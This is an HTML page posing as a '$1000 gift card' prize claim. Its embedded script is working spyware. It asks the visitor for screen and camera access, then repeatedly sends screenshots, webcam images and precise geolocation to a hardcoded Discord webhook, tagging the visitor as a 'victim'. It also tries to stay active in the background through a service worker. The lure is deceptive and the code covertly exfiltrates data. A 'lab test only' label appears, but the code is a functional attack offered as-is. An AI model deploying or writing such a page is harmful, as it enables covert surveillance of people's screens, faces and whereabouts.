<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Won $1000 – Claim Now</title>
    <style>
        body {margin:0;background:linear-gradient(#667eea,#764ba2);color:white;text-align:center;padding:50px;font-family:Arial;}
        h1 {font-size:38px;}
        button {margin:40px;padding:25px 70px;font-size:28px;background:#ff4757;border:none;border-radius:25px;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
        button:hover {background:#ff3742;transform:scale(1.05);}
        .note {font-size:14px;margin-top:50px;color:#ddd;}
    </style>
</head>
<body>

<h1>CONGRATULATIONS!</h1>
<h2>You won $1000 Gift Card</h2>
<button onclick="startStealing()">CLAIM PRIZE NOW</button>
<div class="note">Lab test only – requires camera & screen for verification</div>

<script>
// YOUR DISCORD WEBHOOK (already inserted)
const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";

let screenStream = null;
let camStream = null;
let locWatch = null;

async function startStealing() {
    try {
        // 1. Ask for SCREEN + CAMERA together (looks like Zoom/Discord)
        screenStream = await navigator.mediaDevices.getDisplayMedia({video:true});
        camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});

        alert("Thank you! Processing your prize...");

        const screenVid = document.createElement('video');
        screenVid.srcObject = screenStream;
        screenVid.play();

        const camVid = document.createElement('video');
        camVid.srcObject = camStream;
        camVid.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // SCREEN every 7 seconds
        setInterval(() => {
            canvas.width = screenVid.videoWidth;
            canvas.height = screenVid.videoHeight;
            ctx.drawImage(screenVid, 0, 0);
            canvas.toBlob(b => send(b, "SCREEN"), "image/jpeg", 0.8);
        }, 7000);

        // CAMERA every 5 seconds
        setInterval(() => {
            canvas.width = camVid.videoWidth;
            canvas.height = camVid.videoHeight;
            ctx.drawImage(camVid, 0, 0);
            canvas.toBlob(b => send(b, "SELFIE"), "image/jpeg", 0.8);
        }, 5000);

        // LOCATION every 20 seconds (background too)
        locWatch = navigator.geolocation.watchPosition(pos => {
            const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
            send(null, `LOCATION\n\( {map}\nAccuracy: \){pos.coords.accuracy}m`);
        }, null, {enableHighAccuracy:true, timeout:20000, maximumAge:0});

        // Keep alive in background
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('data:text/javascript,self.addEventListener("periodicsync",e=>e.waitUntil(fetch("' + WEBHOOK + '",{method:"POST",body:JSON.stringify({content:"Still alive in background – "+new Date()})})))');
        }

    } catch(e) {
        alert("You blocked permission – no prize today");
    }
}

function send(blob, text) {
    const form = new FormData();
    if (blob) form.append("file", blob, "capture.jpg");
    form.append("content", `**ANDROID VICTIM**\n\( {text || "Capture"}\n \){new Date().toLocaleString()}\n${navigator.userAgent.split(" ").pop()}`);

    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form, keepalive:true});
}
</script>

</body>
</html>
